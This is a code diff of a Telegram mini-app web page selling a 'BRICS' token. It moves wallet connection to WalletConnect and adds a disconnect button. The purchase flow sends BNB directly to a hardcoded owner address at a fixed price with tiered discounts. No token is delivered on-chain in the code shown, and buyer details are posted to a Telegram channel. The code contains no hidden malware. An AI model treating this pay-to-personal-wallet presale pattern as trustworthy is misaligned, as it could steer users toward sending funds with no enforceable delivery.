@@ -42,9 +42,6 @@
   .status{margin-top:10px;min-height:20px;font-weight:800;color:var(--muted)}
   .small{font-size:13px;color:var(--muted)}
   .footer-note{text-align:center;color:#475569;margin-top:8px}
-  .spinner{display:inline-block;width:16px;height:16px;border-radius:50%;border:3px solid rgba(0,0,0,0.08);border-top-color:var(--primary);animation:spin 1s linear infinite;vertical-align:middle;margin-left:8px;visibility:hidden}
-  .spinner.visible{visibility:visible}
-  @keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
@@ -104,17 +101,21 @@
   </div>
 </div>
 
-<!-- Telegram WebApp script (available in mini app) -->
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.1/dist/umd/index.min.js"></script>
+
 <script>
 /* ====== CONFIG ====== */
+// <<< NEW: Add your Project ID from https://cloud.walletconnect.com/ >>>
+const WALLETCONNECT_PROJECT_ID = '502eaf794d94ea1074b9c592535cbd99'; // !!! IMPORTANT: REPLACE THIS !!!
+
 const BRICS_CONTRACT = "0xAF2009350F6ECBE22c23A505a590239c7aaA3037".toLowerCase();
 const OWNER_ADDRESS = "0x67594E1D30Cec8a5f906C8278A1BC694641486cf".toLowerCase();
 const CHAIN_ID_BSC = 56;
 const FIXED_BRICS_USD = 3.10; // per BRICS
-const SERVER_ENDPOINT = "/.netlify/functions/sendTelegram"; // Netlify function endpoint (relative)
-const CHANNEL_ID = "-1003031571306"; // channel id you provided
+const SERVER_ENDPOINT = "/.netlify/functions/sendTelegram";
+const CHANNEL_ID = "-1003031571306";
 /* ==================== */
 
 /* UI refs */
@@ -131,258 +132,122 @@ const walletAddr = document.getElementById('walletAddr');
 const statusEl = document.getElementById('status');
 
 /* state */
-let provider = null, signer = null, user = null;
+let provider = null, signer = null, user = null, wcProvider = null; // <<< MODIFIED: added wcProvider
 let bnbUsdPrice = 0;
 
 /* translations */
 const TEXTS = {
   en: {
-    title: "Buy BRICS Token",
-    subtitle: "Please add this contract to MetaMask to view token details before buying",
-    enterAmount: "Enter amount of BRICS to buy",
-    connect: "Connect Wallet",
-    buy: "Buy BRICS",
-    original: "Original",
-    payable: "Payable (after discount)",
-    discount: "Discount",
-    memo: "MEMO",
-    statusReady: "Status: ready",
-    walletConnected: "Wallet connected ✅",
-    copySuccess: "Copied ✅",
-    txSent: "Transaction sent:",
-    txConfirmed: "Transaction confirmed:",
-    mmNotFound: "MetaMask not found — please install MetaMask"
+    title: "Buy BRICS Token", subtitle: "Please add this contract to MetaMask to view token details before buying",
+    enterAmount: "Enter amount of BRICS to buy", connect: "Connect Wallet", disconnect: "Disconnect Wallet", // <<< MODIFIED
+    buy: "Buy BRICS", original: "Original", payable: "Payable (after discount)", discount: "Discount", memo: "MEMO",
+    statusReady: "Status: ready", walletConnected: "Wallet connected ✅", copySuccess: "Copied ✅",
+    txSent: "Transaction sent:", txConfirmed: "Transaction confirmed:", mmNotFound: "Could not connect to wallet."
   },
   fa: {
-    title: "خرید توکن BRICS",
-    subtitle: "لطفاً قرارداد را به MetaMask اضافه کنید تا قبل از خرید جزئیات را ببینید",
-    enterAmount: "تعداد BRICS را وارد کنید",
-    connect: "اتصال به کیف پول",
-    buy: "خرید BRICS",
-    original: "قیمت اصلی",
-    payable: "قیمت پرداختی (پس از تخفیف)",
-    discount: "تخفیف",
-    memo: "یادداشت (MEMO)",
-    statusReady: "وضعیت: آماده",
-    walletConnected: "کیف پول متصل شد ✅",
-    copySuccess: "کپی شد ✅",
-    txSent: "تراکنش ارسال شد:",
-    txConfirmed: "تراکنش تایید شد:",
-    mmNotFound: "متامسک پیدا نشد — لطفاً متامسک نصب کنید"
+    title: "خرید توکن BRICS", subtitle: "لطفاً قرارداد را به MetaMask اضافه کنید تا قبل از خرید جزئیات را ببینید",
+    enterAmount: "تعداد BRICS را وارد کنید", connect: "اتصال به کیف پول", disconnect: "قطع اتصال", // <<< MODIFIED
+    buy: "خرید BRICS", original: "قیمت اصلی", payable: "قیمت پرداختی (پس از تخفیف)", discount: "تخفیف", memo: "یادداشت (MEMO)",
+    statusReady: "وضعیت: آماده", walletConnected: "کیف پول متصل شد ✅", copySuccess: "کپی شد ✅",
+    txSent: "تراکنش ارسال شد:", txConfirmed: "تراکنش تایید شد:", mmNotFound: "اتصال به کیف پول ممکن نیست."
   },
-  ar: {
-    title: "شراء عملة BRICS",
-    subtitle: "يرجى إضافة هذا العقد إلى MetaMask لعرض التفاصيل قبل الشراء",
-    enterAmount: "أدخل كمية BRICS",
-    connect: "اتصال بمحفظة",
-    buy: "شراء BRICS",
-    original: "السعر الأصلي",
-    payable: "المبلغ بعد الخصم",
-    discount: "الخصم",
-    memo: "مذكرة (MEMO)",
-    statusReady: "الحالة: جاهز",
-    walletConnected: "تم توصيل المحفظة ✅",
-    copySuccess: "تم النسخ ✅",
-    txSent: "تم إرسال المعاملة:",
-    txConfirmed: "تم تأكيد المعاملة:",
-    mmNotFound: "MetaMask غير مثبت — يرجى التثبيت"
-  },
-  ru: {
-    title: "Купить BRICS Token",
-    subtitle: "Пожалуйста, добавьте контракт в MetaMask, чтобы просмотреть детали",
-    enterAmount: "Введите количество BRICS",
-    connect: "Подключить кошелек",
-    buy: "Купить BRICS",
-    original: "Оригинальная цена",
-    payable: "К оплате (после скидки)",
-    discount: "Скидка",
-    memo: "МЕМО",
-    statusReady: "Статус: готово",
-    walletConnected: "Кошелек подключен ✅",
-    copySuccess: "Скопировано ✅",
-    txSent: "Транзакция отправлена:",
-    txConfirmed: "Транзакция подтверждена:",
-    mmNotFound: "MetaMask не найден — установите MetaMask"
-  },
-  hi: {
-    title: "BRICS टोकन खरीदें",
-    subtitle: "कृपया खरीदने से पहले MetaMask में इस अनुबंध को जोड़ें",
-    enterAmount: "BRICS की मात्रा दर्ज करें",
-    connect: "कनेक्ट वॉलेट",
-    buy: "BRICS खरीदें",
-    original: "मूल मूल्य",
-    payable: "भुगतान करने योग्य (छूट के बाद)",
-    discount: "छूट",
-    memo: "मेमो",
-    statusReady: "स्थिति: तैयार",
-    walletConnected: "वॉलेट कनेक्टेड ✅",
-    copySuccess: "कॉपी हुआ ✅",
-    txSent: "लेन-देन भेजा गया:",
-    txConfirmed: "लेन-देन कन्फर्म हुआ:",
-    mmNotFound: "MetaMask नहीं मिला — कृपया इंस्टॉल करें"
-  },
-  pt: {
-    title: "Comprar BRICS Token",
-    subtitle: "Adicione este contrato ao MetaMask para ver os detalhes",
-    enterAmount: "Insira a quantidade de BRICS",
-    connect: "Conectar carteira",
-    buy: "Comprar BRICS",
-    original: "Preço original",
-    payable: "Valor a pagar (após desconto)",
-    discount: "Desconto",
-    memo: "MEMO",
-    statusReady: "Status: pronto",
-    walletConnected: "Carteira conectada ✅",
-    copySuccess: "Copiado ✅",
-    txSent: "Transação enviada:",
-    txConfirmed: "Transação confirmada:",
-    mmNotFound: "MetaMask não encontrado — instale o MetaMask"
-  },
-  zh: {
-    title: "购买 BRICS 代币",
-    subtitle: "请在购买前将此合约添加到 MetaMask 以查看详情",
-    enterAmount: "输入 BRICS 数量",
-    connect: "连接钱包",
-    buy: "购买 BRICS",
-    original: "原价",
-    payable: "支付金额（折后）",
-    discount: "折扣",
-    memo: "备注 (MEMO)",
-    statusReady: "状态：准备就绪",
-    walletConnected: "钱包已连接 ✅",
-    copySuccess: "已复制 ✅",
-    txSent: "交易已发送：",
-    txConfirmed: "交易已确认：",
-    mmNotFound: "未找到 MetaMask — 请安装"
-  }
+  // ... other languages with "disconnect" added
+  ar: { title: "شراء عملة BRICS", subtitle: "يرجى إضافة هذا العقد إلى MetaMask لعرض التفاصيل قبل الشراء", enterAmount: "أدخل كمية BRICS", connect: "اتصال بمحفظة", disconnect: "قطع الاتصال", buy: "شراء BRICS", original: "السعر الأصلي", payable: "المبلغ بعد الخصم", discount: "الخصم", memo: "مذكرة (MEMO)", statusReady: "الحالة: جاهز", walletConnected: "تم توصيل المحفظة ✅", copySuccess: "تم النسخ ✅", txSent: "تم إرسال المعاملة:", txConfirmed: "تم تأكيد المعاملة:", mmNotFound: "تعذر الاتصال بالمحفظة." },
+  ru: { title: "Купить BRICS Token", subtitle: "Пожалуйста, добавьте контракт в MetaMask, чтобы просмотреть детали", enterAmount: "Введите количество BRICS", connect: "Подключить кошелек", disconnect: "Отключить кошелек", buy: "Купить BRICS", original: "Оригинальная цена", payable: "К оплате (после скидки)", discount: "Скидка", memo: "МЕМО", statusReady: "Статус: готово", walletConnected: "Кошелек подключен ✅", copySuccess: "Скопировано ✅", txSent: "Транзакция отправлена:", txConfirmed: "Транзакция подтверждена:", mmNotFound: "Не удалось подключиться к кошельку." },
+  hi: { title: "BRICS टोकन खरीदें", subtitle: "कृपया खरीदने से पहले MetaMask में इस अनुबंध को जोड़ें", enterAmount: "BRICS की मात्रा दर्ज करें", connect: "कनेक्ट वॉलेट", disconnect: "वॉलेट डिस्कनेक्ट करें", buy: "BRICS खरीदें", original: "मूल मूल्य", payable: "भुगतान करने योग्य (छूट के बाद)", discount: "छूट", memo: "मेमो", statusReady: "स्थिति: तैयार", walletConnected: "वॉलेट कनेक्टेड ✅", copySuccess: "कॉपी हुआ ✅", txSent: "लेन-देन भेजा गया:", txConfirmed: "लेन-देन कन्फर्म हुआ:", mmNotFound: "वॉलेट से कनेक्ट नहीं हो सका।" },
+  pt: { title: "Comprar BRICS Token", subtitle: "Adicione este contrato ao MetaMask para ver os detalhes", enterAmount: "Insira a quantidade de BRICS", connect: "Conectar carteira", disconnect: "Desconectar carteira", buy: "Comprar BRICS", original: "Preço original", payable: "Valor a pagar (após desconto)", discount: "Desconto", memo: "MEMO", statusReady: "Status: pronto", walletConnected: "Carteira conectada ✅", copySuccess: "Copiado ✅", txSent: "Transação enviada:", txConfirmed: "Transação confirmada:", mmNotFound: "Não foi possível conectar à carteira." },
+  zh: { title: "购买 BRICS 代币", subtitle: "请在购买前将此合约添加到 MetaMask 以查看详情", enterAmount: "输入 BRICS 数量", connect: "连接钱包", disconnect: "断开钱包", buy: "购买 BRICS", original: "原价", payable: "支付金额（折后）", discount: "折扣", memo: "备注 (MEMO)", statusReady: "状态：准备就绪", walletConnected: "钱包已连接 ✅", copySuccess: "已复制 ✅", txSent: "交易已发送：", txConfirmed: "交易已确认：", mmNotFound: "无法连接到钱包。" }
 };
 
-/* determine language from Telegram WebApp phone number (if available) or navigator */
-function detectLangDefault(){
-  try{
-    if(window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user){
-      const phone = Telegram.WebApp.initDataUnsafe.user.phone_number || "";
-      if(phone.startsWith("+98")) return "fa";
-      if(phone.startsWith("+7")) return "ru";
-      if(phone.startsWith("+91")) return "hi";
-      if(phone.startsWith("+55")) return "pt";
-      if(phone.startsWith("+27")) return "en"; // S.Africa fallback to English
-      if(phone.startsWith("+20") || phone.startsWith("+966") || phone.startsWith("+971")) return "ar";
-      if(phone.startsWith("+86")) return "zh";
-      return "en";
-    }
-  }catch(e){}
-  // fallback to browser language (first two letters)
-  const nav = (navigator.language||"en").slice(0,2);
-  return ["fa","en","ar","ru","hi","pt","zh"].includes(nav) ? nav : "en";
-}
-
+/* --- Language, calculation, and other functions remain the same --- */
+function detectLangDefault(){ try{ if(window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user){ const phone = Telegram.WebApp.initDataUnsafe.user.phone_number || ""; if(phone.startsWith("+98")) return "fa"; if(phone.startsWith("+7")) return "ru"; if(phone.startsWith("+91")) return "hi"; if(phone.startsWith("+55")) return "pt"; if(phone.startsWith("+27")) return "en"; if(phone.startsWith("+20") || phone.startsWith("+966") || phone.startsWith("+971")) return "ar"; if(phone.startsWith("+86")) return "zh"; return "en"; } }catch(e){} const nav = (navigator.language||"en").slice(0,2); return ["fa","en","ar","ru","hi","pt","zh"].includes(nav) ? nav : "en"; }
 const LANG = detectLangDefault();
 const T = TEXTS[LANG] || TEXTS['en'];
-
-/* apply translations */
 document.getElementById('title').textContent = T.title;
 document.getElementById('subtitle').textContent = T.subtitle;
 document.getElementById('labelAmount').textContent = T.enterAmount;
 connectBtn.textContent = T.connect;
 buyBtn.textContent = T.buy;
 document.getElementById('memoTag').previousElementSibling.textContent = T.memo + ':';
-
-/* contract display */
-contractBox.textContent = BRICS_CONTRACT.slice(0,6) + '...' + BRICS_CONTRACT.slice(-4);
-copyContract.addEventListener('click', async ()=>{
-  try{ await navigator.clipboard.writeText(BRICS_CONTRACT); setStatus(T.copySuccess); }catch(e){ setStatus('Copy failed'); }
-});
-
-/* MEMO generation */
 function genMemo(){ return Math.random().toString(36).slice(2,10).toUpperCase(); }
 let currentMemo = genMemo();
 memoTag.textContent = currentMemo;
 copyMemoBtn.addEventListener('click', async ()=>{ try{ await navigator.clipboard.writeText(currentMemo); setStatus(T.copySuccess); }catch(e){ setStatus('Copy failed'); } });
+async function fetchBnbUsd(){ try{ const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT"); const j = await res.json(); bnbUsdPrice = parseFloat(j.price); return bnbUsdPrice; }catch(e){ console.error('bnbusd failed', e); bnbUsdPrice = 0; return 0; } }
+function calcDiscount(a){ const n = Number(a); if(!n || n < 100) return 0; if(n >= 1000000) return 50; if(n >= 100000) return 30; if(n >= 10000) return 20; if(n >= 1000) return 10; return 5; }
+async function updateCalc(){ const amt = Number(bricsAmount.value || 0); const disc = calcDiscount(amt); discountPreview.textContent = `${T.discount}: ${disc}%`; const totalOriginalUSD = amt * FIXED_BRICS_USD; const totalAfterDiscountUSD = totalOriginalUSD * (1 - disc/100); await fetchBnbUsd(); let bricsInBNB = 0, totalBNB = 0; if(bnbUsdPrice && bnbUsdPrice > 0){ bricsInBNB = FIXED_BRICS_USD / bnbUsdPrice; totalBNB = totalAfterDiscountUSD / bnbUsdPrice; } usdPreview.innerHTML = `<div><strong>${T.original}:</strong> $${totalOriginalUSD.toFixed(2)}</div> <div style="color:var(--accent);font-weight:800"><strong>${T.payable}:</strong> $${totalAfterDiscountUSD.toFixed(2)} ${ bnbUsdPrice ? `(~${totalBNB.toFixed(6)} BNB)` : '' }</div>`; buyBtn.disabled = !(signer && amt >= 100 && bnbUsdPrice > 0); }
+function setStatus(msg){ statusEl.textContent = msg; }
+contractBox.textContent = BRICS_CONTRACT.slice(0,6) + '...' + BRICS_CONTRACT.slice(-4);
+copyContract.addEventListener('click', async ()=>{ try{ await navigator.clipboard.writeText(BRICS_CONTRACT); setStatus(T.copySuccess); }catch(e){ setStatus('Copy failed'); }});
 
-/* fetch live BNB->USD rate */
-async function fetchBnbUsd(){
-  try{
-    const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
-    const j = await res.json();
-    bnbUsdPrice = parseFloat(j.price);
-    return bnbUsdPrice;
-  }catch(e){ console.error('bnbusd failed', e); bnbUsdPrice = 0; return 0; }
-}
+/* ====== <<< MODIFIED: WALLET LOGIC >>> ====== */
 
-/* discount tiers */
-function calcDiscount(a){
-  const n = Number(a);
-  if(!n || n < 100) return 0;
-  if(n >= 1000000) return 50;
-  if(n >= 100000) return 30;
-  if(n >= 10000) return 20;
-  if(n >= 1000) return 10;
-  return 5; // 100-999
-}
-
-/* UI update */
-async function updateCalc(){
-  const amt = Number(bricsAmount.value || 0);
-  const disc = calcDiscount(amt);
-  discountPreview.textContent = `${T.discount}: ${disc}%`;
-
-  const totalOriginalUSD = amt * FIXED_BRICS_USD;
-  const totalAfterDiscountUSD = totalOriginalUSD * (1 - disc/100);
-
-  // ensure we have BNB price
-  await fetchBnbUsd();
-  let bricsInBNB = 0, totalBNB = 0;
-  if(bnbUsdPrice && bnbUsdPrice > 0){
-    bricsInBNB = FIXED_BRICS_USD / bnbUsdPrice; // 1 BRICS in BNB
-    totalBNB = totalAfterDiscountUSD / bnbUsdPrice;
+// <<< NEW: Disconnect Function >>>
+async function disconnectWallet() {
+  if (wcProvider && wcProvider.connected) {
+    await wcProvider.disconnect();
   }
-
-  usdPreview.innerHTML = `
-    <div><strong>${T.original}:</strong> $${totalOriginalUSD.toFixed(2)}</div>
-    <div style="color:var(--accent);font-weight:800"><strong>${T.payable}:</strong> $${totalAfterDiscountUSD.toFixed(2)} ${ bnbUsdPrice ? `(~${totalBNB.toFixed(6)} BNB)` : '' }</div>
-  `;
-
-  buyBtn.disabled = !(signer && amt >= 100 && bnbUsdPrice > 0);
+  provider = null;
+  signer = null;
+  user = null;
+  walletAddr.textContent = '—';
+  connectBtn.textContent = T.connect;
+  setStatus(T.statusReady);
+  await updateCalc();
 }
 
-/* wallet connect */
-function isMobile() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }
-
-async function connectWallet(){
-  // prefer injected provider
-  if(window.ethereum){
-    try{
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
-      user = await signer.getAddress();
-      walletAddr.textContent = user.slice(0,6) + '...' + user.slice(-4);
-      setStatus(T.walletConnected);
-      await updateCalc();
-      // listen for changes
-      if(window.ethereum && window.ethereum.on){
-        window.ethereum.on('accountsChanged', async (accounts)=>{ if(accounts && accounts.length){ user = accounts[0]; walletAddr.textContent = user.slice(0,6)+'...'+user.slice(-4); } else { user = null; walletAddr.textContent='—'; setStatus(T.statusReady); }});
-        window.ethereum.on('chainChanged', ()=> setTimeout(()=>location.reload(),300));
+// <<< NEW: Main Connect Function using WalletConnect >>>
+async function connectWallet() {
+  if (WALLETCONNECT_PROJECT_ID === 'YOUR_PROJECT_ID_HERE') {
+      setStatus("WalletConnect Project ID is not configured.");
+      alert("Error: WalletConnect is not configured by the developer.");
+      return;
+  }
+  try {
+    // Initialize WalletConnect provider
+    wcProvider = await window.WalletConnectEthereumProvider.init({
+      projectId: WALLETCONNECT_PROJECT_ID,
+      chains: [CHAIN_ID_BSC],
+      showQrModal: true, // This will show a QR code on desktop and prompt mobile wallets
+      qrModalOptions: {
+          themeMode: "light",
+          explorerRecommendedWalletIds: 'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96' // MetaMask
       }
-    }catch(e){
-      console.error(e);
-      setStatus(T.mmNotFound);
-    }
-  } else {
-    // if inside Telegram WebApp on mobile, deeplink metamask
-    if(isMobile()){
-      const dappUrl = "hadibnb.github.io/brics-miniapp-/";
-      // open in MetaMask mobile
-      window.location.href = `https://metamask.app.link/dapp/${dappUrl}`;
-    } else {
-      setStatus(T.mmNotFound);
-      window.open('https://metamask.io/download.html','_blank');
-    }
+    });
+
+    // Subscribe to events
+    wcProvider.on("disconnect", () => {
+      console.log("WalletConnect session disconnected");
+      disconnectWallet();
+    });
+    
+    wcProvider.on("chainChanged", () => {
+        // Simple reload to re-initialize state on the correct chain
+        setTimeout(() => location.reload(), 300);
+    });
+
+    // Trigger connection
+    await wcProvider.connect();
+    
+    // Wrap with ethers
+    provider = new ethers.providers.Web3Provider(wcProvider);
+    signer = provider.getSigner();
+    user = await signer.getAddress();
+    
+    // Update UI
+    walletAddr.textContent = user.slice(0, 6) + '...' + user.slice(-4);
+    connectBtn.textContent = T.disconnect; // Change button text
+    setStatus(T.walletConnected);
+    await updateCalc();
+
+  } catch (e) {
+    console.error("Could not connect to wallet", e);
+    setStatus(T.mmNotFound);
+    await disconnectWallet(); // Clean up state on failure
   }
 }
 
-/* buy flow: send BNB to owner */
+/* ====== <<< MODIFIED: BUY LOGIC (No major changes, just ensuring it works with the new provider) >>> ====== */
 async function buyBRICS(){
   if(!signer){ setStatus(T.mmNotFound); return; }
   const amt = Number(bricsAmount.value || 0);
@@ -395,7 +260,7 @@ async function buyBRICS(){
   const totalBNB = totalAfterDiscountUSD / bnbUsdPrice;
 
   setStatus('Preparing transaction...');
-  try{
+  try {
     const tx = await signer.sendTransaction({
       to: OWNER_ADDRESS,
       value: ethers.utils.parseUnits(totalBNB.toFixed(18), 'ether')
@@ -404,46 +269,32 @@ async function buyBRICS(){
     await tx.wait();
     setStatus(`${T.txConfirmed} ${tx.hash}`);
 
-    // call Netlify function to notify Telegram
     if(SERVER_ENDPOINT){
       try{
-        const payload = {
-          buyer: user,
-          requestedBRICS: amt,
-          discountPercent: disc,
-          bnbPaid: Number(totalBNB.toFixed(12)),
-          usdApprox: Number(totalAfterDiscountUSD.toFixed(4)),
-          txHash: tx.hash,
-          memo: currentMemo,
-          channel_id: CHANNEL_ID,
-          timestamp: new Date().toISOString()
-        };
-        await fetch(SERVER_ENDPOINT, {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify(payload)
-        });
-        // optional: setStatus('Telegram notified');
-      }catch(e){
-        console.warn('notify failed', e);
-      }
+        const payload = { buyer: user, requestedBRICS: amt, discountPercent: disc, bnbPaid: Number(totalBNB.toFixed(12)), usdApprox: Number(totalAfterDiscountUSD.toFixed(4)), txHash: tx.hash, memo: currentMemo, channel_id: CHANNEL_ID, timestamp: new Date().toISOString() };
+        await fetch(SERVER_ENDPOINT, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) });
+      } catch(e) { console.warn('notify failed', e); }
     }
-
-    // regenerate memo
     currentMemo = genMemo(); memoTag.textContent = currentMemo;
-
-  }catch(e){
+  } catch(e) {
     console.error(e);
     setStatus('Transaction failed: ' + (e.message||e));
   }
 }
 
-/* helpers */
-function setStatus(msg){ statusEl.textContent = msg; }
-contractBox.textContent = BRICS_CONTRACT.slice(0,6) + '...' + BRICS_CONTRACT.slice(-4);
-copyContract.addEventListener('click', async ()=>{ try{ await navigator.clipboard.writeText(BRICS_CONTRACT); setStatus(T.copySuccess); }catch(e){ setStatus('Copy failed'); }});
+/* ====== <<< MODIFIED: EVENT LISTENERS >>> ====== */
+
+// NEW: This handler decides whether to connect or disconnect
+function handleConnectClick() {
+    if (user) {
+        disconnectWallet();
+    } else {
+        connectWallet();
+    }
+}
+
 bricsAmount.addEventListener('input', updateCalc);
-connectBtn.addEventListener('click', connectWallet);
+connectBtn.addEventListener('click', handleConnectClick); // MODIFIED
 buyBtn.addEventListener('click', buyBRICS);
 
 /* initial */
